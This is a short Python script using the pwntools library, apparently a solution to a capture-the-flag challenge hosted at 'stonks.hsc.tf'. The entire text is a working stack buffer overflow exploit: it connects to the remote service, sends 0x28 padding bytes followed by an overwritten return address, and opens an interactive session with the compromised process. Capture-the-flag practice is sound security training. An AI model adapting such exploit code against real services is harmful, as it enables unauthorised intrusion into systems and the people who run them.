from pwn import *

io = remote('stonks.hsc.tf',1337)
io.recvline('symbol:')
payload = b'A'*0x28+p64(0x401260)
io.sendline(payload)

io.interactive()